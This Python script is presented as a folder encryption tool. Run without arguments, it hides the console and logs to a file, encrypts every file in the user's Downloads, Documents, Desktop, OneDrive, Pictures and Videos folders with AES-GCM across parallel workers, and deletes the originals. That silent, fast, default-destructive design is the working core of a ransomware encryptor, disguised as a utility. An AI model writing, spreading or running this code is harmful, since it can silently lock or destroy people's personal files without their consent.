#!/usr/bin/env python3
"""
Folder Encryption Tool (combined launcher + encryptor)

Recursively encrypts every file in each configured folder using AES-256-GCM
with PBKDF2-HMAC-SHA256 key derivation. Encrypted files get the
original filename + '.enc'.

Multi-core parallel encryption using ThreadPoolExecutor (preferred: the
expensive PBKDF2 and AES-GCM work in `cryptography` releases the GIL, so
threads get real parallelism with none of the ProcessPool pickling /
freeze_support overhead). A process-pool path is retained as an option.

Auto-installs the 'cryptography' dependency if missing.

On Windows, the console window is hidden and all output is written
to encrypt.log next to this script (launcher mode).

Usage:
    python encrypt_folder.py                                  # hardcoded settings (all TARGET_FOLDERS)
    python encrypt_folder.py <folder> <password> [--delete]   # CLI mode (single folder)
    python encrypt_folder.py <folder> <password> --delete --workers 8
    python encrypt_folder.py <folder> <password> --delete --mode process
"""

import ctypes
import os
import sys
import subprocess
import argparse
import importlib.util
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed

# ===========================================================================
#  HARDCODED SETTINGS (used when no CLI args are given)
# ===========================================================================
TARGET_FOLDERS = [
    r"~/Downloads",
    r"~/Documents",
    r"~/Desktop",
    r"~/OneDrive",
    r"~/Pictures",
    r"~/Videos",
]

PASSWORD        = "password"
DELETE_ORIGINAL = True

# Multi-core settings
# Number of workers. None => os.cpu_count() (auto).
# Encryption is dominated by PBKDF2 (CPU-bound, GIL released) + AES-GCM
# (also GIL released) + file I/O. cpu_count() is a good default.
WORKERS = None

# Execution backend: "thread" (default) or "process".
# Threads are preferred: PBKDF2/AES-GCM release the GIL in `cryptography`,
# so you get real parallelism without pickling overhead or Windows
# freeze_support complications. Use "process" only if you suspect a
# crypto backend that does not release the GIL.
EXECUTION_MODE = "thread"

# Files handled per submitted task. Batching cuts future/pickle overhead.
CHUNK_SIZE = 32
# ===========================================================================

# Crypto constants
SALT_SIZE = 16          # bytes
NONCE_SIZE = 12         # bytes (GCM standard)
KEY_SIZE = 32           # 256-bit key
KDF_ITERATIONS = 480_000
MAGIC = b"ENCF"         # File header magic
VERSION = b"\x01"       # File format version
ENC_EXT = ".enc"

SCRIPT_DIR = Path(__file__).resolve().parent
LOG_PATH = SCRIPT_DIR / "encrypt.log"

REQUIRED_PACKAGES = {
    "cryptography": "cryptography",
}


# ---------------------------------------------------------------------------
# Dependency management
# ---------------------------------------------------------------------------
def _is_installed(module_name: str) -> bool:
    return importlib.util.find_spec(module_name) is not None


def _pip_install(package: str) -> bool:
    print(f"[setup] Installing missing dependency: {package} ...")
    candidates = [
        [sys.executable, "-m", "pip", "install", "--upgrade", package],
        [sys.executable, "-m", "pip", "install", "--upgrade", "--user", package],
        [sys.executable, "-m", "pip", "install", "--upgrade",
         "--break-system-packages", package],
    ]
    for cmd in candidates:
        try:
            result = subprocess.run(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception as exc:
            print(f"[setup] Could not run pip: {exc}")
            continue
        if result.returncode == 0:
            print(f"[setup] Installed {package} successfully.")
            return True
        print(f"[setup] pip attempt failed (rc={result.returncode}). Trying next method...")
    return False


def ensure_dependencies() -> None:
    missing = [pkg for mod, pkg in REQUIRED_PACKAGES.items()
               if not _is_installed(mod)]
    if not missing:
        return
    print(f"[setup] Missing dependencies: {', '.join(missing)}")
    if subprocess.run(
        [sys.executable, "-m", "pip", "--version"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    ).returncode != 0:
        print("[setup] pip is not available; attempting to bootstrap it...")
        try:
            subprocess.run(
                [sys.executable, "-m", "ensurepip", "--upgrade"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
            )
        except Exception:
            pass
    for pkg in missing:
        if not _pip_install(pkg):
            sys.exit(
                f"ERROR: could not install required package '{pkg}'.\n"
                f"       Please install it manually:  "
                f"{sys.executable} -m pip install {pkg}"
            )
    for mod, pkg in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(mod)
        except Exception as exc:
            sys.exit(f"ERROR: '{pkg}' is installed but failed to import: {exc}")


# ---------------------------------------------------------------------------
# Console handling
# ---------------------------------------------------------------------------
def hide_console() -> None:
    if os.name != "nt":
        return
    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Crypto imports
# ---------------------------------------------------------------------------
def _crypto():
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes
    return AESGCM, PBKDF2HMAC, hashes


# ---------------------------------------------------------------------------
# Key derivation
# ---------------------------------------------------------------------------
def derive_key(password: str, salt: bytes) -> bytes:
    _, PBKDF2HMAC, hashes = _crypto()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=KEY_SIZE,
        salt=salt,
        iterations=KDF_ITERATIONS,
    )
    return kdf.derive(password.encode("utf-8"))


# ---------------------------------------------------------------------------
# File encryption (used both in-process and by workers)
# ---------------------------------------------------------------------------
def encrypt_file(file_path: Path, password: str, delete_original: bool = False) -> Path:
    """Encrypt a single file. Does NOT print; caller reports results."""
    if file_path.suffix == ENC_EXT:
        return file_path

    AESGCM, _, _ = _crypto()

    salt = os.urandom(SALT_SIZE)
    nonce = os.urandom(NONCE_SIZE)
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)

    plaintext = file_path.read_bytes()
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    out_path = file_path.with_suffix(file_path.suffix + ENC_EXT)
    with open(out_path, "wb") as f:
        f.write(MAGIC)
        f.write(VERSION)
        f.write(salt)
        f.write(nonce)
        f.write(ciphertext)

    if delete_original:
        file_path.unlink()

    return out_path


# ---------------------------------------------------------------------------
# Batched workers (top-level, picklable for ProcessPoolExecutor)
# ---------------------------------------------------------------------------
def _encrypt_batch(paths, password: str, delete_original: bool):
    """Encrypt a batch of files. Returns list of
    (path_str, status, detail) with status in {'ok','skip','error'}."""
    results = []
    for p in paths:
        fp = Path(p)
        try:
            if fp.suffix == ENC_EXT:
                results.append((str(fp), "skip", "already encrypted"))
                continue
            out = encrypt_file(fp, password, delete_original=delete_original)
            results.append((str(fp), "ok", str(out)))
        except Exception as exc:
            results.append((str(fp), "error", f"{type(exc).__name__}: {exc}"))
    return results


def _encrypt_batch_worker(paths, password: str, delete_original: bool):
    """ProcessPoolExecutor entry point (must be module-level)."""
    return _encrypt_batch(paths, password, delete_original)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _resolve_workers(requested) -> int:
    if requested is None or requested <= 0:
        return max(1, os.cpu_count() or 1)
    return requested


def _chunks(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]


def _report(path_str, status, detail, counters):
    if status == "ok":
        counters["ok"] += 1
        print(f"  [enc] {path_str} -> {Path(detail).name}")
    elif status == "skip":
        counters["skip"] += 1
        print(f"  [skip] {path_str}: {detail}")
    else:
        counters["err"] += 1
        print(f"  [error] {path_str}: {detail}")


# ---------------------------------------------------------------------------
# Folder encryption (multi-core)
# ---------------------------------------------------------------------------
def encrypt_folder(folder: Path, password: str, delete_originals: bool = False,
                   workers=None, mode: str = None) -> None:
    """Recursively encrypt all files in a folder using a worker pool."""
    if not folder.is_dir():
        raise NotADirectoryError(f"Not a directory: {folder}")

    mode = mode or EXECUTION_MODE
    files = [p for p in folder.rglob("*") if p.is_file() and p.suffix != ENC_EXT]

    if not files:
        print(f"Nothing to encrypt under {folder}")
        return

    n_workers = _resolve_workers(workers)

    # Tiny workloads: pool startup would dominate. Run in-process.
    if len(files) == 1 or n_workers == 1:
        print(f"Encrypting {len(files)} file(s) under {folder} (single-process) ...")
        counters = {"ok": 0, "skip": 0, "err": 0}
        for f in files:
            _report(*_encrypt_batch([str(f)], password, delete_originals)[0], counters)
        print(f"  Summary: {counters['ok']} encrypted, "
              f"{counters['skip']} skipped, {counters['err']} failed")
        return

    n_workers = min(n_workers, len(files))
    batches = list(_chunks([str(f) for f in files], CHUNK_SIZE))
    backend = "process" if mode == "process" else "thread"

    print(f"Encrypting {len(files)} file(s) under {folder} using "
          f"{n_workers} {backend} worker(s), {len(batches)} batch(es) ...")

    if backend == "process":
        pool = ProcessPoolExecutor(max_workers=n_workers)
        submit = lambda b: pool.submit(_encrypt_batch_worker, b, password, delete_originals)
        use_cancel_futures = True
    else:
        pool = ThreadPoolExecutor(max_workers=n_workers)
        submit = lambda b: pool.submit(_encrypt_batch, b, password, delete_originals)
        use_cancel_futures = True

    counters = {"ok": 0, "skip": 0, "err": 0}
    futures = {}
    try:
        for b in batches:
            futures[submit(b)] = b
        for fut in as_completed(futures):
            for path_str, status, detail in fut.result():
                _report(path_str, status, detail, counters)
    except KeyboardInterrupt:
        print("Interrupted; cancelling pending tasks "
              "(already-running tasks will finish)...")
        for fut in futures:
            fut.cancel()
        # Non-blocking shutdown; Python 3.9+ supports cancel_futures.
        try:
            pool.shutdown(wait=False, cancel_futures=True)
        except TypeError:
            pool.shutdown(wait=False)
        raise
    else:
        pool.shutdown(wait=True)

    print(f"  Summary: {counters['ok']} encrypted, "
          f"{counters['skip']} skipped, {counters['err']} failed")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="AES-256-GCM folder encryption tool (encrypt only). "
                    "With no arguments, uses hardcoded settings and hides console."
    )
    parser.add_argument("folder", nargs="?", type=Path,
                        help="Folder to encrypt (default: hardcoded TARGET_FOLDERS)")
    parser.add_argument("password", nargs="?",
                        help="Encryption password (default: hardcoded PASSWORD)")
    parser.add_argument("--delete", action="store_true",
                        help="Delete original files after successful encryption")
    parser.add_argument("--workers", type=int, default=None,
                        help="Number of worker threads/processes (default: auto = CPU count)")
    parser.add_argument("--mode", choices=("thread", "process"), default=None,
                        help="Worker backend: 'thread' (default) or 'process'")
    return parser


def run_hardcoded() -> int:
    hide_console()

    if not PASSWORD:
        return _log_and_exit("ERROR: PASSWORD is empty in the script", 1)
    if not TARGET_FOLDERS:
        return _log_and_exit("ERROR: TARGET_FOLDERS list is empty", 1)

    valid_folders = []
    with open(LOG_PATH, "a", encoding="utf-8") as log:
        log.write(f"\n--- {datetime.now()} ---\n")
        log.write(f"targets: {len(TARGET_FOLDERS)}\n")
        for raw in TARGET_FOLDERS:
            folder = Path(raw).expanduser()
            if not folder.exists():
                log.write(f"  [skip] folder not found: {folder}\n")
                continue
            if not folder.is_dir():
                log.write(f"  [skip] not a directory: {folder}\n")
                continue
            valid_folders.append(folder)
            log.write(f"  [ok]   {folder}\n")
        log.flush()

    if not valid_folders:
        return _log_and_exit("ERROR: no valid target folders found", 1)

    with open(LOG_PATH, "a", encoding="utf-8") as log:
        old_out, old_err = sys.stdout, sys.stderr
        sys.stdout = sys.stderr = log
        exit_code = 0
        try:
            for folder in valid_folders:
                log.write(f"\n>>> Encrypting {folder}\n")
                log.flush()
                try:
                    encrypt_folder(folder, PASSWORD, DELETE_ORIGINAL,
                                   workers=WORKERS, mode=EXECUTION_MODE)
                    log.write(f"<<< Done: {folder}\n")
                except KeyboardInterrupt:
                    log.write("Interrupted.\n")
                    return 130
                except Exception as exc:
                    log.write(f"ERROR on {folder}: {exc}\n")
                    exit_code = 1
            log.write(f"\n=== Summary: {len(valid_folders)} folder(s) processed ===\n")
        finally:
            sys.stdout, sys.stderr = old_out, old_err
        return exit_code


def _log_and_exit(msg: str, code: int) -> int:
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as log:
            log.write(f"\n--- {datetime.now()} ---\n{msg}\n")
    except Exception:
        pass
    print(msg, file=sys.stderr)
    return code


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    ensure_dependencies()

    if args.folder is None or args.password is None:
        sys.exit(run_hardcoded())

    try:
        encrypt_folder(args.folder, args.password, args.delete,
                       workers=args.workers, mode=args.mode)
    except Exception as exc:
        print(f"ERROR: {exc}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    # Required so ProcessPoolExecutor child processes import main correctly
    # on Windows rather than re-executing the script body (recursive spawn).
    import multiprocessing as mp
    mp.freeze_support()
    main()